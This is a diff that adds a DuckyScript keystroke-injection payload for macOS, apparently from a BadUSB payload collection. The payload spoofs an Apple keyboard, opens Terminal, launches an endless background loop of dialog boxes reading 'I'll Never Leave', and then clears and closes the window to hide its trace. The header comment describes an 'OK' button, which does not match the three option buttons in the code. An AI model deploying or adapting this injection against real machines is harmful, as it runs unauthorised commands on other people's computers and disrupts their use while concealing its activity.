@@ -1,0 +1,32 @@
+REM This script opens an infinite dialog box on MacOS 
+REM that continuously displays the message "I'll Never Leave" with an "OK" button. 
+REM It runs in the background using the nohup command.
+REM The script then clears the terminal and exits. 
+
+
+
+REM To end the loop you need to Kill the PID 
+REM In the terminal, use the command "pgrep osascript" to find the PID of the dialog box loop
+REM Run the command 'Kill PID #' to end the dialog box loop 
+
+
+REM Author: Narsty
+REM Title: Infinite Dialog Box 
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Executions
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING nohup osascript -e 'repeat' -e 'set dialogResult to button returned of (display dialog "I'"'"'ll Never Leave" buttons {"Option 1", "Option 2", "Option 3"} default button 1)' -e 'end repeat' >/dev/null 2>&1 &
+DELAY 500
+GUI k
+DELAY 500
+GUI w
+
